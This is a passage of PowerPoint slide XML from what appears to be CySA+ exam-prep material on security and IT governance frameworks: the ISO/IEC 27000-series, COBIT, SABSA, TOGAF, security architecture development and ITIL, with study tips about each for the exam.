                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Their joint work gives us the ISO/IEC 27000-series, the family of standards defining an Information Security Management System (ISMS), with ISO/IEC 27001 specifying ISMS requirements and 27002 providing the control guidance.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts encounter these standards when an organization's compliance obligations or customer contracts require certification, because findings and reports may need to be mapped to specific 27001/27002 controls.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Recognize that ISO and IEC jointly own the ISO/IEC 27000-series and that 27001 (ISMS requirements) versus 27002 (control guidance) is a common distinction tested.</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816</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Standardize Security Standards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International Organization for Standardization (ISO)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Largest developer of international standards</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Standards range from scientific, food technology, agriculture, space engineering, mining, etc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  International Electrotechnical Commission (IEC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Standards for any electrical &amp; electronic technologies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817</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Standardize Security Standards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ISO &amp; IEC create global ISMS (Information Security Management System) standards</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  ISO/IEC 27000-series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818</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>International Organization for Standardization (ISO)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The International Organization for Standardization (ISO) is an independent, non-governmental body composed of national standards organizations that develops and publishes voluntary international standards across nearly every industry.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  In information security, its most relevant output is the ISO/IEC 27000-series, developed jointly with the IEC, which frames how an organization establishes, operates, and continually improves an Information Security Management System.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ISO certification is achieved through independent third-party audit, giving an organization internationally recognized proof that its security program meets a defined standard.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC analyst, ISO standards define the control set that audit-driven reporting must demonstrate coverage against, especially for organizations that trade internationally.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect ISO to appear as the international standards body behind ISO/IEC 27001 certification, contrasted with U.S. frameworks like NIST 800-53.</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819</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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International Organization for Standardization (ISO)</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g_be0717a8c1.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1398122" y="1783080"/>
            <a:ext cx="9392707" cy="4434840"/>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820</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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COBIT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COBIT (Control Objectives for Information and Related Technologies) is a framework of governance and management objectives for enterprise IT, developed by ISACA in collaboration with the IT Governance Institute (ITGI).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Rather than focusing narrowly on security controls, COBIT defines control objectives that align IT and information-system management with overall business goals, covering areas like planning, delivery, and monitoring.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The current COBIT 2019 edition is built around governance and management objectives and design factors that let an organization tailor an IT governance system to its context.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts benefit because COBIT gives leadership a governance lens that connects the SOC's technical work to business risk and value, which matters when reporting to executives and auditors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know COBIT as ISACA's IT governance framework aligning IT to business objectives, distinct from the operational, control-focused NIST and ISO catalogs.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821</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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COBIT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Control Objectives for Information and Related Technology (COBIT)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Framework and controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Developed by ISACA (formerly Information Systems Audit and Control Association, now only known by its acronym)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In collaboration with IT Governance Institute (ITGI)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Defines control goals for IT &amp; IS system management</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822</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Control Objectives for Information and Related Technology (COBIT)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This is the full name of COBIT, an IT governance and management framework maintained by ISACA that defines the control objectives an organization should meet to keep its IT and information systems well-governed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It emphasizes governance, risk, and compliance at the enterprise level, providing a structured way to ensure IT decisions support business strategy and that accountability is clearly assigned.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  COBIT is often used alongside more technical frameworks, mapping high-level governance objectives to the detailed controls found in standards such as ISO 27001 or NIST 800-53.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For an analyst, understanding COBIT clarifies why certain controls exist and how technical findings roll up into the governance and audit reporting leadership relies on.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Recognize the expanded title and associate it with ISACA-driven IT governance and audit alignment rather than hands-on technical control implementation.</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823</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Control Objectives for Information and Related Technology (COBIT)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g_2a3caa6fc8.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3888312" y="1783080"/>
            <a:ext cx="4412328" cy="4434840"/>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824</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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SABSA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SABSA (Sherwood Applied Business Security Architecture) is a framework and methodology for developing risk-driven enterprise information security and information assurance architectures.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is built around a layered model, moving from the contextual and conceptual layers (the business view) down through logical, physical, and component layers to operational management, ensuring security is traceable back to business requirements.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A defining principle of SABSA is that every architecture decision is derived from an analysis of business needs, so controls exist to serve measurable business objectives rather than as arbitrary technical add-ons.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts encounter SABSA in mature organizations where it explains why the security controls they monitor are structured the way they are and how those controls tie back to business risk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Identify SABSA as a business-risk-driven, layered security architecture framework, distinguishing it from governance frameworks like COBIT and enterprise-architecture frameworks like TOGAF.</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825</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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SABSA</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g_c8345eb04e.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="903697" y="1783080"/>
            <a:ext cx="10381557" cy="4434840"/>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826</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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SABSA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g_d01acd10f3.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1262892" y="1783080"/>
            <a:ext cx="9663168" cy="4434840"/>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827</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Open Group Architecture Framework (TOGAF)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TOGAF is a widely adopted framework and methodology for designing, planning, implementing, and governing enterprise architecture, originally derived from a U.S. Department of Defense architecture framework and now maintained by The Open Group.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its centerpiece is the Architecture Development Method (ADM), a repeatable cycle of phases that guides an organization from architecture vision through business, information-systems, and technology architectures to implementation and change management.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because it is a general enterprise-architecture standard used by a large share of Fortune 500 companies, TOGAF provides the structural blueprint into which security architecture, and by extension security controls, must fit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts benefit from recognizing TOGAF because it explains how security requirements are integrated into overall enterprise design, ensuring their findings and recommendations align with how the business architects its systems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know TOGAF as The Open Group's enterprise-architecture framework built around the ADM, contrasted with security-specific frameworks like SABSA and governance frameworks like COBIT.</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828</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Open Group Architecture Framework (TOGAF)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Originated in Department of Defense</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Now run by The Open Group</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Standard for enterprise architecture</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Used by most Fortune 500 companies worldwide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829</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Architecture Development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Architecture development is the practice of designing an organization's security posture as a deliberate, documented structure rather than a collection of ad hoc tools, aligning technical controls, network segmentation, identity, and data flows with business requirements and the organization's risk tolerance.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It typically follows recognized frameworks such as SABSA, TOGAF, or the NIST controls families, so that reporting maps findings back to a defined baseline and every proposed change can be justified against the intended design.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC analyst, a documented security architecture is what turns a raw finding into an actionable recommendation, because it gives a reference model to compare current state against and a common language to communicate gaps to engineering and management.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: On CySA+ it appears when you must recommend architectural changes (segmentation, defense in depth, secure design) as the outcome of a report or assessment rather than a one-off patch.</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830</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Architecture Development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g_3907a1d7d3.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4358153" y="1783080"/>
            <a:ext cx="3472645" cy="4434840"/>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831</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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ITIL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ITIL (Information Technology Infrastructure Library) is a framework of best practices for delivering IT services that are aligned to business goals, providing a common vocabulary and repeatable processes for how IT work is planned, delivered, and improved.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is organized into a service lifecycle of five core elements: Service Strategy (define what services meet business needs), Service Design (design those services and their security), Service Transition (build, test, and deploy changes into production), Service Operation (run and support live services, including incident and problem management), and Continual Service Improvement (measure and refine over time).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security analysts care because incident response, change management, and vulnerability remediation all flow through ITIL processes, so understanding it lets an analyst raise tickets, request emergency changes, and report metrics in a way the rest of IT already follows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam expects you to recognize ITIL as a service-management framework and to place security activities like incident and change management within its lifecycle stages.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832</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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ITIL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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Aligns IT services to reach business goals</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  5 core elements:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ITIL Service Strategy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ITIL Service Design</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ITIL Service Transition</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ITIL Service Operation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
